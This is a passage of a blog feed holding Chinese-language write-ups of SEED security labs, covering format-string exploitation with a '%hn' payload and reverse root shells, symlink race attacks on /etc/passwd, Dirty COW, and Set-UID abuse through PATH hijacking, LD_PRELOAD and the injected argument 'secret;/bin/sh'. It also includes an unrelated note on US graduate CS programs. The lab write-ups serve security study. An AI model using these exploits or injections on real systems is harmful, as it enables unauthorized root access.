class="hljs-string">"%55112x%64$hn%10415x%65$hn"</span>fmt  = (s).encode('latin-1')content[<span class="hljs-number">8</span>:<span class="hljs-number">8</span>+len(fmt)] = fmt# Save the format <span class="hljs-built_in">string</span> to filewith open('badfile', 'wb') as f:  f.<span class="hljs-built_in">write</span>(content)</code></pre><p><img src="/2021/05/12/Format-String-lab-1/18.PNG" srcset="/img/loading.gif" alt="18"></p><p>可以看到reverse shell成功</p><h2 id="Task-5-Attacking-the-64-bit-Server-Program"><a href="#Task-5-Attacking-the-64-bit-Server-Program" class="headerlink" title="Task 5: Attacking the 64-bit Server Program"></a>Task 5: Attacking the 64-bit Server Program</h2><p>您的工作是构造有效负载以利用服务器的格式字符串漏洞。您的最终目标是在目标服务器上获得一个根shell。</p><p>首先就是先打印出来栈上面的信息</p><p><img src="/2021/05/12/Format-String-lab-1/19.PNG" srcset="/img/loading.gif" alt="19"></p><p>然后发现buffer起始位置是第34个参数</p><p>然后开始找return address的位置，根据提示信息中的frame pointer来找，frame pointer是0x00007fffffffe4c0，所以return address所在的位置就应该是0x00007fffffffe4c8</p><h4 id="问题-amp-解决"><a href="#问题-amp-解决" class="headerlink" title="问题&amp;解决"></a>问题&amp;解决</h4><p>printf在遇一个字节的0的时候会停止解析，<strong>解决方法就是将对应的地址放在buffer的比较高的地方</strong></p><p>要修改位于<code>0x00007fffffffe4c8</code>的return address的值，仍然将shellcode放在距离buffer0x100的地方，所以此时shellcode的起始位置是<code>0x00007fffffffe680</code></p><p>所以0x00007fffffffe4c8的低两位需要放0xe680，0x00007fffffffe4cA的中两位需要放0xffff，0x00007fffffffe4cc的高两位放0x7fff，最高位放0x0000</p><p>按照这个来修改对应文件，在这里没有贴上来，搞清思路了就基本没有什么难点。关于printf具体实现，可参考：<a href="https://blog.csdn.net/zhengqijun_/article/details/72454714" target="_blank" rel="noopener">printf 函数实现的深入剖析</a></p><p>然后运行结果如下：</p><p><img src="/2021/05/12/Format-String-lab-1/20.PNG" srcset="/img/loading.gif" alt="20"></p><p>可以看到reverse shell成功</p><h2 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h2><p>warning信息</p><pre><code class="hljs livecodeserver"><span class="hljs-built_in">format</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">string</span> literal <span class="hljs-keyword">and</span> no <span class="hljs-built_in">format</span> arguments</code></pre><p>是在说不是在格式化参数，解决方案，改为printf（“%s”,msg）即可，此时没有warning</p><p><img src="/2021/05/12/Format-String-lab-1/21.PNG" srcset="/img/loading.gif" alt="21"></p><p><img src="/2021/05/12/Format-String-lab-1/22.PNG" srcset="/img/loading.gif" alt="22"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Software security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>The information of School</title>
    <link href="/2021/05/07/The-information-of-School/"/>
    <url>/2021/05/07/The-information-of-School/</url>
    
    <content type="html"><![CDATA[<h2 id="USC（南加州大学）"><a href="#USC（南加州大学）" class="headerlink" title="USC（南加州大学）"></a>USC（南加州大学）</h2><h3 id="综述："><a href="#综述：" class="headerlink" title="综述："></a>综述：</h3><p><strong>针对南加州大学来说，缺少的信息在于没有具体的GPA以及TOEFL、GRE要求，但是能够找到相应的课程</strong></p><p>还有就是很多项目在第一轮筛选的时候就不是target，所以就没有将信息放上去</p><p>每个项目后面的*的数量代表优先程度</p><ul><li><p><a href="https://www.cs.usc.edu/academic-programs/masters/" target="_blank" rel="noopener">项目链接</a></p><ul><li><p><a href="https://www.cs.usc.edu/academic-programs/masters/computer-science-general/" target="_blank" rel="noopener">M.S. Computer Science (General)</a>    （*根据课程来看不是很感兴趣）</p><ul><li><p><a href="https://www.cs.usc.edu/academic-programs/masters/artificial-intelligence/" target="_blank" rel="noopener">AI</a>（4 * 感兴趣，属于第一档）</p><p><img src="/2021/05/07/The-information-of-School/1.PNG" srcset="/img/loading.gif" alt="1"></p></li></ul></li><li><p><a href="https://www.cs.usc.edu/academic-programs/masters/intelligent-robotics/" target="_blank" rel="noopener">Intelligent Robotics</a>（2 * 半）</p><p>  <img src="/2021/05/07/The-information-of-School/2.PNG" srcset="/img/loading.gif" alt="2"></p></li></ul></li></ul><h2 id="uchicago（芝加哥大学）"><a href="#uchicago（芝加哥大学）" class="headerlink" title="uchicago（芝加哥大学）"></a>uchicago（芝加哥大学）</h2><h3 id="综述：-1"><a href="#综述：-1" class="headerlink" title="综述："></a>综述：</h3><p><strong>信息浏览过之后发现就俩项目，而且MPCS（master program of computer science）和CAPP，看完课程信息之后感觉都不是特别合适</strong></p><h2 id="uci（加州大学欧文分校）"><a href="#uci（加州大学欧文分校）" class="headerlink" title="uci（加州大学欧文分校）"></a>uci（加州大学欧文分校）</h2><h3 id="综述：-2"><a href="#综述：-2" class="headerlink" title="综述："></a>综述：</h3><p><strong>Computer Science方面的项目比较少</strong></p><ul><li><p><a href="http://catalogue.uci.edu/donaldbrenschoolofinformationandcomputersciences/departmentofcomputerscience/computerscience_ms/#text" target="_blank" rel="noopener">Computer Science, M.S</a>.（2 *半）</p><p>  <img src="/2021/05/07/The-information-of-School/3.PNG" srcset="/img/loading.gif" alt="3"></p></li><li><p><a href="http://catalogue.uci.edu/donaldbrenschoolofinformationandcomputersciences/departmentofcomputerscience/computerscience_master/#requirementstext" target="_blank" rel="noopener">Master of Computer Science</a>（勉强3 *）</p></li></ul><p><img src="/2021/05/07/The-information-of-School/4.PNG" srcset="/img/loading.gif" alt="4"></p><p><img src="/2021/05/07/The-information-of-School/5.PNG" srcset="/img/loading.gif" alt="5"></p><h2 id="Northwestern-University（西北大学）待补充"><a href="#Northwestern-University（西北大学）待补充" class="headerlink" title="Northwestern University（西北大学）待补充"></a>Northwestern University（西北大学）待补充</h2><h3 id="综述：-3"><a href="#综述：-3" class="headerlink" title="综述："></a>综述：</h3><ul><li>Master of Science in Computer Science (MS)</li></ul><h2 id="Duke（杜克大学）"><a href="#Duke（杜克大学）" class="headerlink" title="Duke（杜克大学）"></a>Duke（杜克大学）</h2><h3 id="综述：-4"><a href="#综述：-4" class="headerlink" title="综述："></a>综述：</h3><p><strong>MS in Computer Science和MS in Economics and Computation，只有两个项目，并且第一个项目没有具体的信息，</strong></p><p><strong>暂时对杜克无感，觉得也申不上。。。</strong></p><h2 id="brown（布朗大学）需帮助补充"><a href="#brown（布朗大学）需帮助补充" class="headerlink" title="brown（布朗大学）需帮助补充"></a>brown（布朗大学）需帮助补充</h2><h3 id="综述：-5"><a href="#综述：-5" class="headerlink" title="综述："></a>综述：</h3><p><strong>项目较少并且没有找到相关的课程设置，同时未找到录取相关推荐信要求以及GPA</strong></p><ul><li>the <a href="https://cs.brown.edu/degrees/masters" target="_blank" rel="noopener">Master of Science in Computer Science</a></li></ul><h2 id="RICE（莱斯大学）"><a href="#RICE（莱斯大学）" class="headerlink" title="RICE（莱斯大学）"></a>RICE（莱斯大学）</h2><h3 id="综述：-6"><a href="#综述：-6" class="headerlink" title="综述："></a>综述：</h3><p><strong>program太少，而且要么是面向就业，要么是profession，专业硕士</strong></p><ul><li>录取要求：<strong>至少三封推荐信，托福最少90</strong></li><li><a href="https://csweb.rice.edu/academics/graduate-programs/professional-masters-programs" target="_blank" rel="noopener">Master of Computer Science Program</a>（面向就业的，先给2 *）</li></ul><h2 id="Yale（耶鲁大学）"><a href="#Yale（耶鲁大学）" class="headerlink" title="Yale（耶鲁大学）"></a>Yale（耶鲁大学）</h2>]]></content>
    
    
    
    <tags>
      
      <tag>School Information</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Race Condition</title>
    <link href="/2021/04/21/Race-Condition/"/>
    <url>/2021/04/21/Race-Condition/</url>
    
    <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><blockquote><p> A race condition occurs when multiple processes access and manipulate the same data concurrently, and the outcome of the execution depends on the particular order in which the access takes place. If a privileged program has a race-condition vulnerability, attackers can run a parallel process to “race” against the privileged program, with an intention to change the behaviors of the program.</p></blockquote><h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p><img src="/2021/04/21/Race-Condition/1.PNG" srcset="/img/loading.gif" alt="1"></p><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><h3 id="task-1"><a href="#task-1" class="headerlink" title="task 1"></a>task 1</h3><p><img src="/2021/04/21/Race-Condition/2.PNG" srcset="/img/loading.gif" alt="2"></p><h3 id="task-2"><a href="#task-2" class="headerlink" title="task 2"></a>task 2</h3><blockquote><p>The ultimate goal is to gain the root privilege. The most critical step of the attack, making /tmp/XYZ point to the password file, must occur within the window between check and use; namely between the access and fopen calls in the vulnerable program.</p></blockquote><h4 id="Task-2-A-Simulating-a-Slow-Machine"><a href="#Task-2-A-Simulating-a-Slow-Machine" class="headerlink" title="Task 2.A: Simulating a Slow Machine"></a>Task 2.A: Simulating a Slow Machine</h4><p>最开始的时候需要将/tmp/XYZ连接到/dev/null，这样才会保证能够进入到access函数当中</p><p><img src="/2021/04/21/Race-Condition/3.PNG" srcset="/img/loading.gif" alt="3"></p><p>然后此时可以进行写入，但是需要在休眠10s的时候修改符号链接</p><p><img src="/2021/04/21/Race-Condition/4.PNG" srcset="/img/loading.gif" alt="4"></p><p><img src="/2021/04/21/Race-Condition/5.PNG" srcset="/img/loading.gif" alt="5"></p><p><img src="/2021/04/21/Race-Condition/6.PNG" srcset="/img/loading.gif" alt="6"></p><p>可以看到对应的字符串已经添加到了目标文件当中</p><h4 id="Task-2-B-The-Real-Attack"><a href="#Task-2-B-The-Real-Attack" class="headerlink" title="Task 2.B: The Real Attack"></a>Task 2.B: The Real Attack</h4><blockquote><p>The typical strategy in race condition attacks is to run the attack program in parallel to the target program, hoping to be able to do the critical step within that time window. </p></blockquote><p>the malicious.c code</p><p><img src="/2021/04/21/Race-Condition/8.PNG" srcset="/img/loading.gif" alt="8"></p><p>and the what we need to do is modifying the .sh and run it parallelly</p><p><img src="/2021/04/21/Race-Condition/9.PNG" srcset="/img/loading.gif" alt="9"></p><p><img src="/2021/04/21/Race-Condition/7.PNG" srcset="/img/loading.gif" alt="7"></p><p>we can find that the passwd has already been changed</p><h4 id="Task-2-C-An-Improved-Attack-Method"><a href="#Task-2-C-An-Improved-Attack-Method" class="headerlink" title="Task 2.C: An Improved Attack Method"></a>Task 2.C: An Improved Attack Method</h4><blockquote><p>如果XYZ变成root的，攻击将不会成功，因为使用seed权限运行的攻击程序将无法再取消链接。这是因为/tmp文件夹上有一个“sticky”位，这意味着只有文件的所有者才能删除该文件，即使该文件夹是可写的。</p><p>出现这种情况的主要原因是，攻击程序在unlink之后，symlink之前，上下文就被关闭了。因为这两个操作不是原子的，所以如果上下文切换发生在两者之间，目标Set UID程序有机会运行open函数，它将创建一个以root为所有者的新文件。之后，攻击程序将无法再对/tmp/XYZ进行更改。</p></blockquote><p>为解决上述问题，将两个操作变为原子的，具体如下。不断改变XYZ链接的文件，实现攻击的条件。</p><p><img src="/2021/04/21/Race-Condition/11.PNG" srcset="/img/loading.gif" alt="11"></p><p><img src="/2021/04/21/Race-Condition/10.PNG" srcset="/img/loading.gif" alt="10"></p><p><img src="/2021/04/21/Race-Condition/12.PNG" srcset="/img/loading.gif" alt="12"></p><h3 id="Task-3-Countermeasures"><a href="#Task-3-Countermeasures" class="headerlink" title="Task 3: Countermeasures"></a>Task 3: Countermeasures</h3><h4 id="Task-3-A-Applying-the-Principle-of-Least-Privilege"><a href="#Task-3-A-Applying-the-Principle-of-Least-Privilege" class="headerlink" title="Task 3.A: Applying the Principle of Least Privilege"></a>Task 3.A: Applying the Principle of Least Privilege</h4><p><img src="/2021/04/21/Race-Condition/14.PNG" srcset="/img/loading.gif" alt="14"></p><p><img src="/2021/04/21/Race-Condition/13.PNG" srcset="/img/loading.gif" alt="13"></p><p>no permission occur when it cannot open the file. And when it links to /dev/null, it can pass the accsee(), but there is no root privilege to modify the file</p><h4 id="Task-3-B-Using-Ubuntu’s-Built-in-Scheme"><a href="#Task-3-B-Using-Ubuntu’s-Built-in-Scheme" class="headerlink" title="Task 3.B: Using Ubuntu’s Built-in Scheme"></a>Task 3.B: Using Ubuntu’s Built-in Scheme</h4><p><img src="/2021/04/21/Race-Condition/15.PNG" srcset="/img/loading.gif" alt="15"></p><p>打开内置保护后，攻击也会失败。当保护机制打开时，满足以下条件之一才允许跟随符号链接：</p><ul><li><p>符号链接所在文件夹不是“黏性”的</p></li><li><p>符号链接的uid和follower匹配</p></li><li><p>符号链接的所有者和文件夹的所有者匹配</p></li></ul><h1 id="Dirty-Cow"><a href="#Dirty-Cow" class="headerlink" title="Dirty Cow"></a>Dirty Cow</h1><p><img src="/2021/04/21/Race-Condition/16.PNG" srcset="/img/loading.gif" alt="16"></p><h3 id="Task-2-Modify-the-Password-File-to-Gain-the-Root-Privilege"><a href="#Task-2-Modify-the-Password-File-to-Gain-the-Root-Privilege" class="headerlink" title="Task 2: Modify the Password File to Gain the Root Privilege"></a>Task 2: Modify the Password File to Gain the Root Privilege</h3><p><img src="/2021/04/21/Race-Condition/17.PNG" srcset="/img/loading.gif" alt="17"></p><p><img src="/2021/04/21/Race-Condition/18.PNG" srcset="/img/loading.gif" alt="18"></p>]]></content>
    
    
    
    <tags>
      
      <tag>software security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>environment variable and set-uid program</title>
    <link href="/2021/04/11/environment-variable-and-set-uid-program/"/>
    <url>/2021/04/11/environment-variable-and-set-uid-program/</url>
    
    <content type="html"><![CDATA[<h2 id="Lab-Tasks"><a href="#Lab-Tasks" class="headerlink" title="Lab Tasks"></a>Lab Tasks</h2><h3 id="task-1：manipulate-environment-variable"><a href="#task-1：manipulate-environment-variable" class="headerlink" title="task 1：manipulate environment variable"></a>task 1：manipulate environment variable</h3><ul><li>打印环境变量</li></ul><p><img src="/2021/04/11/environment-variable-and-set-uid-program/1.PNG" srcset="/img/loading.gif" alt="1"></p><ul><li>使用export和unset来设置和取消设置环境变量</li></ul><blockquote><p>这两条命令不是单独的程序，是bash的内部命令，而shell默认的程序是/bin/bash</p></blockquote><p><img src="/2021/04/11/environment-variable-and-set-uid-program/2.PNG" srcset="/img/loading.gif" alt="2"></p><h3 id="task2：Passing-environment-variable"><a href="#task2：Passing-environment-variable" class="headerlink" title="task2：Passing environment variable"></a>task2：Passing environment variable</h3><h4 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h4><p>对program进行编译，这个program会使得它的子进程打印出来字符指针数组的信息</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/3.PNG" srcset="/img/loading.gif" alt="3"></p><p>可以看到，相应的环境变量的信息是被打印出来了，之后将这些信息存储在文件当中</p><h4 id="step-2"><a href="#step-2" class="headerlink" title="step 2"></a>step 2</h4><p>修改之后重新进行编译运行</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/4.PNG" srcset="/img/loading.gif" alt="4"></p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/5.PNG" srcset="/img/loading.gif" alt="5"></p><p>然后存储在file1文件当中</p><h4 id="step-3"><a href="#step-3" class="headerlink" title="step 3"></a>step 3</h4><p>之后通过<code>diff file file1</code>来进行对比，会看到除了第48行中可执行文件的名字不同之外，environment variable并没有区别</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/6.PNG" srcset="/img/loading.gif" alt="6"></p><p>总结，通过fork()产生的子进程拥有和父进程完全一致的环境变量</p><h3 id="task-3：Environment-Variables-and-execve"><a href="#task-3：Environment-Variables-and-execve" class="headerlink" title="task 3：Environment Variables and execve()"></a>task 3：Environment Variables and execve()</h3><h4 id="step-1-1"><a href="#step-1-1" class="headerlink" title="step 1"></a>step 1</h4><p>在这个task当中，我们所要研究的是exevce()函数以及在调用前后environment variable的变化</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/7.PNG" srcset="/img/loading.gif" alt="7"></p><p>此时，不打印任何东西，分析原因，会发现是由于在execve当中传递的第三个指针数组为空，所以此时没有环境变量可打印</p><h4 id="step-2-1"><a href="#step-2-1" class="headerlink" title="step 2"></a>step 2</h4><p>修改指针数组内容为全局环境变量，可以看到相应的变量信息被打印出来</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/8.PNG" srcset="/img/loading.gif" alt="8"></p><h4 id="step-3-1"><a href="#step-3-1" class="headerlink" title="step 3"></a>step 3</h4><p>再次修改传递的指针数组的内容，之后编译运行</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/9.PNG" srcset="/img/loading.gif" alt="9"></p><p>可以看到，新的环境变量就是我们所设置的指针数组里面的内容</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/10.PNG" srcset="/img/loading.gif" alt="10"></p><p>总结：通过execve()运行的新的进程是通过指针数组，以传参的形式获取environment variable的</p><h3 id="task-4：Environment-Variables-and-system"><a href="#task-4：Environment-Variables-and-system" class="headerlink" title="task 4：Environment Variables and system()"></a>task 4：Environment Variables and system()</h3><p>逻辑是这样的，system()和execve()类似，调用一个新的程序，只不过system()已经设置好了所需要调用的文件/bin/sh，而system()回调用execl()函数，而execl()则会调用execve()函数</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/12.PNG" srcset="/img/loading.gif" alt="12"></p><p>而如果直接运行该命令，可以看到输出的内容是一样的</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/13.PNG" srcset="/img/loading.gif" alt="13"></p><p>总结：当我们运行system()函数的时候，抛开外表，也是通过传递指针数组的形式来传递环境变量的</p><h3 id="Task-5-Environment-Variable-and-Set-UID-Programs"><a href="#Task-5-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 5: Environment Variable and Set-UID Programs"></a>Task 5: Environment Variable and Set-UID Programs</h3><p>在这个task当中，我们aim at <code>set-uid</code>程序是否会继承来自用户程序的environment variable，关于set-uid程序，参考<a href="https://www.cnblogs.com/bwangel23/p/4225818.html" target="_blank" rel="noopener">setuid函数解析</a></p><h4 id="step-1-2"><a href="#step-1-2" class="headerlink" title="step 1"></a>step 1</h4><p><img src="/2021/04/11/environment-variable-and-set-uid-program/14.PNG" srcset="/img/loading.gif" alt="14"></p><h4 id="step-2-2"><a href="#step-2-2" class="headerlink" title="step 2"></a>step 2</h4><p>之后需要让这个program具有root权限以及使它成为一个<code>Set-UID</code>程序</p><blockquote><p>chmod 4755与chmod 755对比多了附加权限值4，这个4表示其他用户执行文件时，具有与所有者同样的权限（设置了SUID）。</p><p>为什么要设置4755 而不是 755？<br>假设netlogin是root用户创建的一个上网认证程序，如果其他用户要上网也要用到这个程序，那就需要root用户运行chmod 755 netlogin命令使其他用户也能运行netlogin。但假如netlogin执行时需要访问一些只有root用户才有权访问的文件，那么其他用户执行netlogin时可能因为权限不够还是不能上网。这种情况下，就可以用 chmod 4755 netlogin 设置其他用户在执行netlogin也有root用户的权限，从而顺利上网。</p></blockquote><p><img src="/2021/04/11/environment-variable-and-set-uid-program/15.PNG" srcset="/img/loading.gif" alt="15"></p><h4 id="step-3-2"><a href="#step-3-2" class="headerlink" title="step 3"></a>step 3</h4><p>把对应的environment variable在用户环境下设置好</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/16.PNG" srcset="/img/loading.gif" alt="16"></p><p>之后运行，可以看到我们设置的environment variable中的MYSHELL是被打印出来了，说明该环境变量是从shell 程序当中继承过来的</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/17.png" srcset="/img/loading.gif" alt="17"></p><p>修改一下code，然后依旧给他root的权限以及set-uid的权限</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/19.PNG" srcset="/img/loading.gif" alt="19"></p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/18.PNG" srcset="/img/loading.gif" alt="18"></p><p>可以看到，我们能找到PATH以及自己定义的环境变量，无法找到第二个环境变量LD LIBRARY PATH</p><h4 id="为什么LD-LIBRARY-PATH环境变量不会被包含到子进程的环境变量中呢"><a href="#为什么LD-LIBRARY-PATH环境变量不会被包含到子进程的环境变量中呢" class="headerlink" title="为什么LD_LIBRARY_PATH环境变量不会被包含到子进程的环境变量中呢?"></a>为什么LD_LIBRARY_PATH环境变量不会被包含到子进程的环境变量中呢?</h4><p>参考blog：<a href="https://blog.csdn.net/C_Ronaldo__/article/details/112506896?utm_medium=distribute.pc_relevant_download.none-task-blog-baidujs-1.nonecase&depth_1-utm_source=distribute.pc_relevant_download.none-task-blog-baidujs-1.nonecase" target="_blank" rel="noopener">SEEDLab Environment Variable and Set-UID Program Lab 实验报告</a></p><h3 id="Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs"><a href="#Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 6: The PATH Environment Variable and Set-UID Programs"></a>Task 6: The PATH Environment Variable and Set-UID Programs</h3><p>首先，task6告诉我们在set-uid当中调用sytem()函数是很危险的，因为shell程序可能会受到环境变量的影响。</p><p>攻击逻辑是这样的，我们通过修改环境变量来针对于set-uid程序进行攻击（其实实际上是针对于set-uid程序当中的system()函数来进行的）</p><ul><li>step1</li></ul><p>首先，code进行编译运行，注意在这里为防止/bin/sh的不在set-uid当中执行的策略，我们需要</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;   system(<span class="hljs-string">"ls"</span>);   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><img src="/2021/04/11/environment-variable-and-set-uid-program/20.PNG" srcset="/img/loading.gif" alt="20"></p><ul><li>step2</li></ul><p>接下来，我们aim at如何执行自己的恶意代码而不是/bin/ls，并且能否获得root权限</p><p>第一个攻击的点在于ls命令是相对寻址的，而不是根据绝对地址来进行运行，所以可以在寻找命令的时候让解析器去找我们所想要执行的恶意代码，需要修改PATH路径，同时，为了得到root权限，我们需要由前两个lab一样呢进行reverse shell下面是具体步骤</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/22.PNG" srcset="/img/loading.gif" alt="22"></p><p>首先，在reverse shell当中，都是执行/bin/sh，通过上面命令来讲/bin/sh文件复制到<code>/home/seed/Desktop/lab3/Labsetup</code>当中，并且重命名为ls</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/23.PNG" srcset="/img/loading.gif" alt="23"></p><p>之后将相对路径加入到PATH环境变量当中，可以看到会首先寻找我的相对路径，之后再次运行task6，就可以获得root权限</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/21.PNG" srcset="/img/loading.gif" alt="21"></p><p>总结：在这一步当中，我们利用了environment variable中的PATH变量来针对ls命令进行攻击，并且通过set-uid程序获得了root权限</p><h3 id="Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs"><a href="#Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 7: The LD PRELOAD Environment Variable and Set-UID Programs"></a>Task 7: The LD PRELOAD Environment Variable and Set-UID Programs</h3><p>task7先告诉了我们LD_PRELOAD这个环境变量是用来加载用户指定的共享库的，并且是优先于其他所有的动态库的，下面来看一下具体是如何影响的以及我们能怎么利用</p><blockquote><p>动态链接器程序有一个防御机制,当进程的真实用户ID与有效用户ID不一样时,或者真实组ID与有效组ID不一致时,进程将会忽略LD_PRELOAD,LD_LIBRARY_PATH环境变量.</p></blockquote><h4 id="step-1-3"><a href="#step-1-3" class="headerlink" title="step 1"></a>step 1</h4><p>首先按照步骤建立连接库并且修改LD_PRELOAD环境变量</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/24.PNG" srcset="/img/loading.gif" alt="24"></p><h4 id="step-2-3"><a href="#step-2-3" class="headerlink" title="step 2"></a>step 2</h4><ul><li>Make myprog a regular program, and run it as a normal user.</li></ul><p><img src="/2021/04/11/environment-variable-and-set-uid-program/25.PNG" srcset="/img/loading.gif" alt="25"></p><p>此时连接到的是我们重新编译之后的库文件</p><ul><li>Make myprog a Set-UID root program, and run it as a normal user.</li></ul><p><img src="/2021/04/11/environment-variable-and-set-uid-program/26.PNG" srcset="/img/loading.gif" alt="26"></p><p>此时，结果是sleep一秒之后退出，连接到的是原来的库文件</p><ul><li><p>Make myprog a Set-UID root program, export the LD PRELOAD environment variable again in the root account and run it.</p><p>  <img src="/2021/04/11/environment-variable-and-set-uid-program/27.PNG" srcset="/img/loading.gif" alt="27"></p></li></ul><p>此时，在root用户下运行会发现连接到的是重新编译后的库文件</p><ul><li><p>Make myprog a Set-UID user1 program (i.e., the owner is user1, which is another user account), export the LD PRELOAD environment variable again in a different user’s account (not-root user) and run it.<img src="/2021/04/11/environment-variable-and-set-uid-program/28.PNG" srcset="/img/loading.gif" alt="28"></p><p>  创建用户test并且在seed账户中export，此时sleep一秒之后结束程序，连接到的是原来的库文件</p><p>  而当我们是在test账户当中进行export的时候，会发现此时打印消息，连接到的是重新编译后的共享库</p><p>  <img src="/2021/04/11/environment-variable-and-set-uid-program/29.PNG" srcset="/img/loading.gif" alt="29"></p></li></ul><h4 id="step-3-3"><a href="#step-3-3" class="headerlink" title="step 3"></a>step 3</h4><p>在这一步当中，我们aim at背后的机制，可以肯定的是一定和环境变量有关，并且根据hint可以得知，有的子shell可能不会继承父shell的LD*的环境变量，所以设计思路就是在我们myprog.c文件当中打印出LD_PRELOAD的值</p><p>动态链接器防御机制</p><blockquote><p>动态链接器程序有一个防御机制,当进程的真实用户ID与有效用户ID不一样时,或者真实组ID与有效组ID不一致时,进程将会忽略LD_PRELOAD,LD_LIBRARY_PATH环境变量.</p></blockquote><ul><li>针对Make myprog a regular program, and run it as a normal user.</li></ul><p>此时myprog的实际用户是seed，而有效用户也是seed，所以此时会发生重载，并且运行myprog的shell程序会是继承父shell程序的environment variable</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/30.PNG" srcset="/img/loading.gif" alt="30"></p><ul><li>针对Make myprog a Set-UID root program, export the LD PRELOAD environment variable again in the root account and run it.</li></ul><p>此时myprog的实际用户是seed，而有效用户是root，所以会忽略LD_PRELOAD（实际上执行myprog的shell进程就没有继承来自父shell的LD_PRELOAD的环境变量）</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/31.PNG" srcset="/img/loading.gif" alt="31"></p><p>后面两个实际上是同理的</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/32.PNG" srcset="/img/loading.gif" alt="32"></p><h3 id="Task-8-Invoking-External-Programs-Using-system-versus-execve"><a href="#Task-8-Invoking-External-Programs-Using-system-versus-execve" class="headerlink" title="Task 8: Invoking External Programs Using system() versus execve()"></a>Task 8: Invoking External Programs Using system() versus execve()</h3><p>这个task的target是看system()和execve()之间的区别以及调用shell的另一个危险之处？还与环境变量无关？</p><h4 id="step-1-4"><a href="#step-1-4" class="headerlink" title="step 1"></a>step 1</h4><p>在这一步当中，我们就把seed当作是Bob，所以需要做的就是运行catall文件来进行删除不属于我们权限的文件</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/33.PNG" srcset="/img/loading.gif" alt="33"></p><p>发现这个文件是没有了的，而secret这个文件有效用户为root，其他的用户权限仅为r；我们将这个文件删除了，说明在catall这个set-uid程序当中，我们以root权限执行来rm的操作，同理，我们也可以通过这个方法来获取shell权限</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/34.PNG" srcset="/img/loading.gif" alt="34"></p><h4 id="step-2-4"><a href="#step-2-4" class="headerlink" title="step 2"></a>step 2</h4><p>当我们把上面的system()函数换成execve()函数的时候，会发现</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/35.png" srcset="/img/loading.gif" alt="35"></p><p>此时无法执行多条命令，无法删除secret文件同时也不能获得root权限</p><h4 id="探究"><a href="#探究" class="headerlink" title="探究"></a>探究</h4><p>首先是从system()函数上来看</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/36.PNG" srcset="/img/loading.gif" alt="36"></p><blockquote><p>总结来看，调用system()的话首先运行fork,产生一个子进程,然后使用execl函数进行运行命令/bin/sh,产生一个shell程序,运行command命令,同时,将环境变量显式传递给新程序.同时在父进程中调用wait去等待子进程结束.</p><p>环境变量经过了三个阶段:</p><ol><li>进程本身拥有</li><li>fork时复制给子进程</li><li>execl函数运行时,显式赋值给新程序</li></ol></blockquote><p>在第二步中,引入了外部程序shell,而在shell中,是可以执行任何指令的,所以,我们可以执行多条指令,在设置setuid程序后,可以获取root权限.<br>而execve函数为执行一个系统调用函数</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[],<span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> envp[])</span></span>;</code></pre><p>第二个参数中如果包含额外的指令,他们仍然会被视为一个参数,并非一个指令.所以才会出现:</p><blockquote><p>/bin/cat: ‘secret;/bin/sh’: No such file or directory</p></blockquote><p>的错误,secret;/bin/sh被视为了一个字符串参数.<br>system()函数违背了最小权限原则,调用了shell,而shell可以执行任意命令.以及输入验证原则,过分信任了用户的输入.所以,system()函数需要谨慎使用,推荐使用execve()函数,进行了运行程序与程序参数的分类,更安全.</p><h3 id="Task-9-Capability-Leaking"><a 